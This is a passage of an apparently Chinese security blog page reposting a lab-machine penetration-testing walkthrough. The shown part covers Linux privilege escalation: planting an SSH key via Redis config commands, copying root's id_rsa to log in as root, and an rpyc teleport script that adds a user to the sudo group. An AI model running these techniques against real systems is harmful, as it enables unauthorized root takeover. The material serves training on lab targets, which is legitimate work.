+<p>/.ssh$ (echo -e “\n\n”; cat authorized_keys;echo -e “\n\n”) &gt; pub.txt</p>
+<p>cat pub.txt | redis-cli -a 密码 -x set ssh_key</p>
+<p>再次登录 config set dir /root/.ssh</p>
+<p>config set dbfilename “authorized_keys”</p>
+<p>Save</p>
+<p><strong>12.读取root账号的公私钥进行提权</strong>：</p>
+<p>去读取root账号的公私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tarS -cvf k.tar /root/.ssh/id_rsa</span><br><span class="line">tar -xvf k.tar</span><br><span class="line">ssh -i id_rsa root@localhost -p 2082</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>13.rpyc远程管理进行提权 添加sudo权限的exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import rpyc</span><br><span class="line">def shell():</span><br><span class="line">import os</span><br><span class="line">os.system(“sudo usermod -a -G sudo ragnar”)</span><br><span class="line">conn = rpyc.classic.connect(“localhost”)</span><br><span class="line">fn=conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="四．总结"><a href="#四．总结" class="headerlink" title="四．总结"></a><strong>四．总结</strong></h1><p>在打靶过程中一定需要注意信息收集的仔细，细节之处有时就包括有没有ls -la查看到某个隐藏的文件，或者路径爆破是不是少了某个关键的路径</p>
+<p>建议使用高质量的字典来进行扫描，要善于使用nday进行打点，突破边界之后的提权也需要仔细的信息收集</p>
+<p>查看一些敏感的账号目录与命令操作历史，不能放过每一个细节</p>
+<p>原文地址：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339942.html">https://www.freebuf.com/articles/web/339942.html</a></p>
+<p><strong>声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。****所有渗透都需获取授权</strong>！</p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/";
+            const title         = "「渗透学习靶机打靶思路与方法」";
+            const excerpt       = `一．对靶机进行信息收集1.首先对目标存活靶机发起嗅探：
+①sudo arp-scan -l 针对网卡发起扫描存活主机
+②arping扫描：for i in (seq 1 254);do arping −c 2 10.0.2.i; do...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2022-12-06</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 脚本小子天堂" href="/2022/11/02/脚本小子天堂/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="disqus_thread" class="post-comments lazy-load"></div>
+
+<script>
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '2022/11/30/渗透学习靶机打靶思路与方法/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    var load_comm = () => {
+        if (typeof DISQUS == 'undefined') {
+            var d = document, s = d.createElement('script');
+            s.src = 'https://.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        } else {
+            DISQUS.reset({
+                reload: true,
+                config: function () {  
+                    this.page.url = 'http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/';  // Replace PAGE_URL with your page's canonical URL variable
+                    this.page.identifier = '2022/11/30/渗透学习靶机打靶思路与方法/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                }
+            });
+        }
+    };
+    
+</script>
+<script async id="dsq-count-scr" src="//.disqus.com/count.js"></script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8E%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一．对靶机进行信息收集</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8E%E4%B8%80%E4%BA%9B%E9%9D%B6%E6%9C%BA%E6%89%93%E7%82%B9%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">二．一些靶机打点的工具和知识：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%EF%BC%8E%E8%BF%9B%E8%A1%8Clinux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83"><span class="toc-text">三．进行linux下的提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8E%E6%80%BB%E7%BB%93"><span class="toc-text">四．总结</span></a>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%B8%B8/">日常</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%93%9D%E9%98%9F/">蓝队</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Apache-2-4-49/" style="font-size: 0.6em;">Apache 2.4.49</a> <a href="/tags/Spring-Boot/" style="font-size: 0.6em;">Spring Boot</a> <a href="/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" style="font-size: 0.6em;">Struts2漏洞复现总结</a> <a href="/tags/iis/" style="font-size: 0.6em;">iis</a> <a href="/tags/log4j/" style="font-size: 0.6em;">log4j</a> <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">sql 注入</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 0.6em;">信息收集</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.6em;">文件上传</a> <a href="/tags/%E6%BA%AF%E6%BA%90/" style="font-size: 0.6em;">溯源</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 0.6em;">漏洞扫描</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/"><i class="fa  fa-book"></i> 渗透学习靶机打靶思路与方法</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/02/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E5%A4%A9%E5%A0%82/"><i class="fa  fa-book"></i> 脚本小子天堂</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/09/29/HW%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E6%B5%81%E7%A8%8B%E8%AF%A6%E7%BB%86%E6%95%B4%E7%90%86%E5%88%86%E4%BA%AB/"><i class="fa  fa-book"></i> HW蓝队溯源流程详细整理分享</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><i class="fa  fa-book"></i> log4j原理分析</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"><i class="fa  fa-book"></i> 文件上传漏洞扫描器和利用工具</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/CandyUnion"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https://nya.one/@zr"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/zr-blog"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 Love is a Moment Story 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by zhang rui.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://zr-blog.github.io/" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7026505671"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
